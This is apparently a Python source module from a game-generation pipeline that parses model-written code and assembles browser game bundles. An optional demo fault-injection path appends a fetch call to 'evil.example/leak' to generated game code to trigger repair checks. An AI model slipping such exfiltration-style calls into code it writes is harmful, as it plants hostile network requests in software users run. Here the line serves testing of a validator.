"""Code generation and revision nodes for the GameWeave LangGraph pipeline."""
# ruff: noqa: F401,F403,F405
from app.agents.nodes_common import *
from app.services.artifacts import runtime_artifact
from app.services.phaser_projects import create_modular_phaser_project
from app.services.vite_projects import (
    VITE_PROJECT_FORMAT,
    create_phaser_vite_project,
    is_vite_project,
)


def _should_inject(state: dict) -> bool:
    """演示用故障注入（默认关闭）。开启后 prompt 含 force-repair/force-replan
    会故意注入违禁 API 触发修复回环 —— 必须由配置显式打开，绝不能让普通用户的
    prompt 文本改变引擎行为（用户创意里碰巧出现关键词会白烧一轮修复预算）。"""
    from app.core.config import settings

    if not settings.DEMO_FAULT_INJECTION:
        return False
    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
    if "force-replan" in p:
        return state.get("replan_attempts", 0) == 0
    if "force-repair" in p:
        return state.get("repair_attempts", 0) == 0
    return False


def _extract_js(raw: str) -> str:
    if not raw:
        return ""
    match = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
    text = (match.group(1) if match else raw).strip()
    return re.sub(r"</?script[^>]*>", "", text, flags=re.I).strip()


def _extract_bundle(raw: str) -> dict:
    """Parse a model reply into {path: content}. Expects three fenced blocks
    (html / css / js); degrades gracefully when labels are missing or merged."""
    if not raw:
        return {}
    out: dict[str, str] = {}
    for lang, path in (("html", "index.html"), ("css", "style.css"), ("javascript", "game.js"), ("js", "game.js")):
        if path in out:
            continue
        m = re.search(r"```[ \t]*" + lang + r"[^\n]*\n(.*?)```", raw, re.S | re.I)
        if m:
            out[path] = m.group(1).strip()
    # A long streaming response can be interrupted after opening the final
    # fenced block but before the closing fence arrives. Keep that partial block
    # so validation/repair can decide whether it is usable instead of throwing
    # away minutes of generated code.
    for lang, content in re.findall(
        r"```[ \t]*(html|css|javascript|js)[^\n]*\n(.*?)(?:```|\Z)",
        raw,
        re.S | re.I,
    ):
        path = "game.js" if lang.lower() in {"javascript", "js"} else ("style.css" if lang.lower() == "css" else "index.html")
        if path not in out and content.strip():
            out[path] = content.strip()
    if "game.js" in out:
        return out
    # Fallback: classify unlabeled fenced blocks by their content.
    for block in re.findall(r"```[^\n]*\n(.*?)```", raw, re.S):
        block = block.strip()
        low = block[:400].lower()
        if "index.html" not in out and ("<!doctype" in low or "<html" in low):
            out["index.html"] = block
        elif "game.js" not in out and "<html" not in low and any(
            tok in low for tok in ("getcontext", "requestanimationframe", "addeventlistener", "function ", "=>")
        ):
            out["game.js"] = block
        elif "style.css" not in out and "<" not in low and "{" in block and "}" in block:
            out["style.css"] = block
    if "game.js" not in out and not out:
        js = _extract_js(raw)
        if js:
            out["game.js"] = js
    return out


_DEFAULT_CSS = (
    "*{margin:0;padding:0;box-sizing:border-box}"
    "html,body{height:100%;overflow:hidden;background:#05070f;"
    "font-family:ui-monospace,monospace;-webkit-user-select:none;user-select:none;touch-action:none}"
    "canvas{display:block;position:absolute;inset:0}"
)


def _assemble_bundle(bundle: dict, title: str, dimension: str = "2d", runtime: str = "canvas") -> list[dict]:
    """Turn parsed model files into the canonical 3-file bundle; synthesize a
    minimal index.html / style.css when the model only returned game.js.
    Ensure the self-hosted engine (3D: three.min.js / 2D-phaser: phaser.min.js)
    loads before game.js."""
    js = bundle.get("game.js", "")
    css = bundle.get("style.css") or _DEFAULT_CSS
    index = bundle.get("index.html")
    engine = "three.min.js" if dimension == "3d" else ("phaser.min.js" if runtime == "phaser" else None)
    engine_tag = f'<script src="{engine}"></script>' if engine else ""
    if not index or "game.js" not in index:
        index = (
            '<!doctype html><html><head><meta charset="utf-8">'
            '<meta name="viewport" content="width=device-width,initial-scale=1">'
            f"<title>{title}</title>"
            '<link rel="stylesheet" href="style.css"></head><body>'
            '<canvas id="stage"></canvas>'
            f'{engine_tag}<script src="game.js"></script></body></html>'
        )
    elif engine and engine not in index:
        # 模型给了 index 但漏了引擎：插到 <head> 末尾，确保先于 game.js 执行。
        if "</head>" in index:
            index = index.replace("</head>", f"{engine_tag}</head>", 1)
        else:
            index = index.replace("<body>", f"<body>{engine_tag}", 1)
    return [
        {"path": "index.html", "content": index},
        {"path": "style.css", "content": css},
        {"path": "game.js", "content": js},
    ]


_REFERENCE_BY_ARCHETYPE = {
    "vertical_shooter": "neondodge",
    "lane_runner": "neondodge",
    "topdown_collect": "moonlitkoi",
    "logic_grid": "runecircuit",
}


_REFERENCE_BY_GENRE = {
    "shooter": "neondodge",
    "runner": "neondodge",
    "arcade": "moonlitkoi",
    "collector": "starcatch",
    "puzzle": "runecircuit",
    "quiz": "colormatch",
}


_REFERENCE_BY_ARCHETYPE_3D = {
    "fps_arena": "warpspire",
    "collector_3d": "warpspire",
    "runner_3d": "warpspire",
    "racer_3d": "warpspire",
}


def _reference_for(spec: dict) -> str | None:
    if str(spec.get("dimension") or "") == "3d":
        key = _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or "")) or "warpspire"
        return bundles.BUNDLES.get(key)
    archetype = str(spec.get("archetype") or "")
    genre = str(spec.get("genre") or "").lower()
    key = _REFERENCE_BY_ARCHETYPE.get(archetype) or _REFERENCE_BY_GENRE.get(genre) or "moonlitkoi"
    return bundles.BUNDLES.get(key)


def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str, list[str]]:
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    title = str(spec.get("title") or "GameWeave Game")
    agent_logs: list[str] = []

    # 3D：无模板兜底，完全由模型产出。失败/过短 → 返回不合规 bundle，交给 repair/replan。
    if state.get("dimension") == "3d":
        files: list[dict] = []
        tokens = 0
        if not state.get("use_real"):
            mode = "3D needs real model (offline mock cannot author 3D)"
        else:
            try:
                result = llm.chat(
                    prompts.CODE_SYSTEM_PROMPT_3D,
                    prompts.build_code_prompt(
                        spec,
                        design,
                        _reference_for(spec),
                        repair_error,
                        dimension="3d",
                        asset_manifest=state.get("asset_manifest"),
                    ),
                    timeout=settings.OPENAI_CODE_TIMEOUT,
                    allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
                )
                raw, tokens = result
                bundle = _extract_bundle(raw)
                js = bundle.get("game.js", "")
                files = _assemble_bundle(bundle, title, dimension="3d")
                if js and len(js) > 400:
                    partial = "partial " if getattr(result, "partial", False) else ""
                    mode = f"model ({partial}full 3D bundle)" if bundle.get("index.html") else f"model ({partial}3D game.js)"
                else:
                    mode = "model 3D output too short -> QA/repair"
            except Exception as exc:  # noqa: BLE001
                _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
                files = []
                mode = f"model 3D failed: {_clip(exc, 120)}"
        if _should_inject(state):
            for file in files:
                if file["path"] == "game.js":
                    file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
        return files, tokens, mode, agent_logs

    # Every newly generated 2D game is a native Phaser/Vite/TypeScript project.
    # Historical legacy bundles remain readable/revisable, but are never used as
    # a generation or fallback target.
    files = create_modular_phaser_project(
        spec,
        design,
        state.get("balance_config") or {},
        state.get("asset_manifest") or {},
    )
    tokens = 0
    mode = "modular TypeScript template"
    if state.get("use_real") and not state.get("use_template_code"):
        if code_agent.author_enabled(state) and repair_error is None:
            qa_feedback = [str(item) for item in (state.get("gameplay_qa_feedback") or [])]
            outcome = code_agent.run_author(
                files,
                spec=spec,
                design=design,
                runtime="phaser-vite",
                dimension="2d",
                qa_feedback=qa_feedback or None,
            )
            authored_project = bool(
                outcome
                and outcome.changed
                and is_vite_project(outcome.files)
            )
            if authored_project:
                files = outcome.files
                tokens = outcome.tokens
                agent_logs = list(outcome.logs)
                check_status = (
                    "typecheck/build ok"
                    if outcome.checks_ok
                    else "outer build/repair pending"
                )
                mode = (
                    f"project author ({len(files)} file(s), {outcome.turns} turn(s), "
                    f"{check_status})"
                )
                if not outcome.checks_ok:
                    agent_logs.append(
                        "author self-checks did not pass; preserving project for isolated build and repair"
                    )
            else:
                detail = "project author unavailable or returned no valid project changes"
                _real_model_fallback_or_raise("GameProjectAuthor", detail)
                agent_logs = list(outcome.logs) if outcome else []
                agent_logs.append(f"{detail}; using modular TypeScript template")
            if qa_feedback:
                agent_logs.insert(
                    0,
                    "carried prior gameplay QA findings into the author prompt: " + "; ".join(qa_feedback)[:400],
                )
        else:
            agent_logs.append(
                "repair regeneration uses the stable modular template"
                if repair_error
                else "modular project author disabled; using the typed Phaser project template"
            )
    elif state.get("use_real") and state.get("use_template_code"):
        agent_logs.append(
            "replan requested the stable fallback; using the modular TypeScript template"
        )
    if _should_inject(state):
        for file in files:
            if file.get("path") == "src/main.ts":
                file["content"] += '\nfetch("https://evil.example/leak"); // [demo] forbidden API'
    return files, tokens, mode, agent_logs


def _revision_file_map(files: list[dict] | None) -> dict[str, str]:
    # 全量文件按原顺序进 map：修订提示词的 html/css/js 标签只寻址三件套，
    # 作者模式产出的额外模块（shop.js 等）原样保留、字节不动。
    return {
        str(file.get("path")): str(file.get("content") or "")
        for file in (files or [])
        if file.get("path") and file.get("content_b64") is None
    }


def _generate_revision_code(
    state: dict, repair_error: str | None = None
) -> tuple[list[dict], int, list[str], str]:
    source_files = (
        state.get("project_files") or state.get("generated_files")
        if repair_error and (state.get("project_files") or state.get("generated_files"))
        else state.get("existing_files")
    ) or []
    source = _revision_file_map(source_files)
    source_items = {str(file.get("path")): dict(file) for file in source_files if file.get("path")}
    if is_vite_project(source_files):
        feedback = str(state.get("source_feedback") or state.get("prompt") or "")
        if not state.get("use_real"):
            marker_path = "src/config/gameConfig.ts"
            if marker_path in source:
                marker = re.sub(r"[\r\n]+", " ", _clip(feedback, 180))
                source_items[marker_path] = {
                    "path": marker_path,
                    "content": f"{source[marker_path]}\n// GameWeave offline revision note: {marker}\n",
                }
                return list(source_items.values()), 0, [marker_path], "offline modular project revision"
            return list(source_items.values()), 0, [], "offline modular project unchanged"
        if code_agent.enabled(state):
            editable = [dict(item) for item in source_files if item.get("content_b64") is None]
            outcome = code_agent.run_revision(
                editable,
                feedback=feedback,
                spec=state.get("game_spec") or {},
                design=state.get("game_design") or {},
            )
            if outcome and outcome.checks_ok:
                for item in outcome.files:
                    if item.get("path"):
                        source_items[str(item["path"])] = dict(item)
                return (
                    list(source_items.values()),
                    outcome.tokens,
                    outcome.changed,
                    f"project revision agent ({outcome.turns} turn(s), typecheck/build ok)",
                )
            detail = "project revision agent unavailable or checks failed"
            _real_model_fallback_or_raise("GameProjectRevision", detail)
            return list(source_items.values()), 0, [], detail
        return (
            list(source_items.values()),
            0,
            [],
            "project revision agent disabled; enable CODE_AGENT_ENABLED",
        )
    if not state.get("use_real"):
        merged = dict(source)
        feedback = _clip(state.get("source_feedback") or state.get("prompt") or "", 180)
        if "game.js" in merged:
            marker = re.sub(r"[\r\n]+", " ", feedback)
            merged["game.js"] = f"{merged['game.js']}\n// GameWeave offline {state.get('task_kind', 'revision')} note: {marker}\n"
            changed = ["game.js"]
        else:
            changed = []
        for path, content in merged.items():
            source_items[path] = {"path": path, "content": content}
        files = list(source_items.values())
        return files, 0, changed, f"offline deterministic {state.get('task_kind', 'revision')}"

    result = llm.chat(
        prompts.CODE_REVISION_SYSTEM_PROMPT,
        prompts.build_code_revision_prompt(
            state.get("source_feedback") or state.get("prompt") or "",
            state.get("feedback_brief") or "",
            state.get("game_spec") or {},
            state.get("game_design") or {},
            source_files,
            repair_error,
            state.get("memory_context") or "",
        ),
        timeout=settings.OPENAI_CODE_TIMEOUT,
        allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
    )
    raw, tokens = result
    returned = _extract_bundle(raw)
    merged = dict(source)
    changed: list[str] = []
    for path in ("index.html", "style.css", "game.js"):
        content = returned.get(path)
        if content is None or content == source.get(path):
            continue
        merged[path] = content
        changed.append(path)
    for path, content in merged.items():
        source_items[path] = {"path": path, "content": content}
    files = list(source_items.values())
    partial = "partial " if getattr(result, "partial", False) else ""
    return files, tokens, changed, f"model {partial}incremental revision"


def code_revision_node(state: dict) -> dict:
    try:
        files, tokens, changed, mode = _generate_revision_code(state)
    except Exception as exc:  # noqa: BLE001
        if state.get("use_real"):
            _real_model_fallback_or_raise("CodeRevisionAgent", exc, exc)
        files, tokens, changed, mode = state.get("existing_files") or [], 0, [], f"revision failed: {_clip(exc, 160)}"
    vite = is_vite_project(files)
    return {
        "generated_files": [] if vite else files,
        "project_files": files if vite else [],
        "artifact_format": VITE_PROJECT_FORMAT if vite else "legacy-bundle/v1",
        "code_source": "revision",
        "revision_result": {"changed_files": changed, "base_version": state.get("base_version")},
        "_agent": "CodeRevisionAgent",
        "_tokens_delta": tokens,
        "_logs": [
            f"base version: {state.get('base_version')}",
            f"revision mode: {mode}",
            "changed files: " + (", ".join(changed) if changed else "none"),
        ] + _file_log_lines(files),
    }


def _prepare_generated_artifacts(files: list[dict], state: dict) -> dict:
    spec = state.get("game_spec") or {}
    generated_assets = state.get("generated_assets") or []
    if is_vite_project(files):
        existing_paths = {str(item.get("path") or "") for item in files}
        project_files = list(files) + [
            dict(item) for item in generated_assets if item.get("path") not in existing_paths
        ]
        return {
            "generated_files": [],
            "project_files": project_files,
            "artifact_format": VITE_PROJECT_FORMAT,
            "build_result": {},
        }

    index = next((str(item.get("content") or "") for item in files if item.get("path") == "index.html"), "")
    use_vite = (
        state.get("dimension") == "2d"
        and "phaser.min.js" in index
    )
    if use_vite:
        project_files = create_phaser_vite_project(
            files,
            generated_assets,
            title=str(spec.get("title") or "GameWeave Game"),
        )
        return {
            "generated_files": [],
            "project_files": project_files,
            "artifact_format": VITE_PROJECT_FORMAT,
            "build_result": {},
        }
    existing_paths = {str(item.get("path") or "") for item in files}
    runtime_assets = [runtime_artifact(item) for item in generated_assets]
    files = list(files) + [item for item in runtime_assets if item.get("path") not in existing_paths]
    return {
        "generated_files": files,
        "project_files": [],
        "artifact_format": "legacy-bundle/v1",
        "build_result": {"ok": True, "skipped": True},
    }


def code_generation_node(state: dict) -> dict:
    files, tokens, mode, agent_logs = _generate_code(state)
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    if state.get("dimension") == "3d":
        scene = design.get("scene") if isinstance(design.get("scene"), dict) else {}
        logs = [
            "render mode: 3D WebGL via self-hosted Three.js (relative three.min.js, global THREE)",
            f"archetype: {spec.get('archetype')} ({(state.get('archetype_result') or {}).get('label', '3D')})",
            f"camera/scene: {scene.get('camera', 'n/a')} · {_clip(scene.get('environment'), 80)}",
            "few-shot reference: " + _REFERENCE_BY_ARCHETYPE_3D.get(str(spec.get("archetype") or ""), "three_fps"),
            f"game.js source: {mode}",
        ] + _file_log_lines(files)
    else:
        balance = state.get("balance_config") or {}
        controls = design.get("controls") if isinstance(design.get("controls"), dict) else {}
        palette_source = "design palette" if design.get("palette") else "derived from title/theme"
        logs = [
            "selected template: neutral Phaser/Vite/TypeScript stage + quality kit (Juice/Sfx/palette)",
            f"runtime config: archetype={spec.get('archetype') or design.get('archetype')} (metadata), target={balance.get('target_score', 120)}, lives={balance.get('lives', 3)}",
            f"visual identity: {palette_source}",
            f"signature twist: {_clip(design.get('signature_twist') or 'none planned', 110)}",
            f"control hint: {_clip(controls.get('hint') or 'WASD / arrows', 90)}",
            f"{'project source' if is_vite_project(files) else 'game.js source'}: {mode}",
        ] + _file_log_lines(files)
    if agent_logs:
        logs += agent_logs
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    if state.get("dimension") == "3d":
        code_source = "model"
    elif mode.startswith("project author"):
        code_source = "author"
    else:
        code_source = "template"
    prepared = _prepare_generated_artifacts(files, state)
    if prepared["artifact_format"] == VITE_PROJECT_FORMAT:
        project_files = prepared["project_files"]
        logs += [
            "artifact format: phaser-vite/v1",
            f"project source files: {len(project_files)}",
            "runtime publication waits for isolated Vite build",
        ]
        return {
            **prepared,
            "code_source": code_source,
            "gameplay_qa_feedback": None,  # 失因清单已随本轮提示词消费
            "_agent": "GameCodeAgent",
            "_tokens_delta": tokens,
            "_logs": logs,
        }

    if state.get("generated_assets"):
        logs.append(f"attached generated runtime assets: {len(state.get('generated_assets') or [])}")
    return {
        **prepared,
        "code_source": code_source,
        "gameplay_qa_feedback": None,
        "_agent": "GameCodeAgent",
        "_tokens_delta": tokens,
        "_logs": logs,
    }


__all__ = [
    '_should_inject',
    '_extract_js',
    '_extract_bundle',
    '_DEFAULT_CSS',
    '_assemble_bundle',
    '_REFERENCE_BY_ARCHETYPE',
    '_REFERENCE_BY_GENRE',
    '_REFERENCE_BY_ARCHETYPE_3D',
    '_reference_for',
    '_generate_code',
    '_revision_file_map',
    '_generate_revision_code',
    '_prepare_generated_artifacts',
    'code_revision_node',
    'code_generation_node',
]
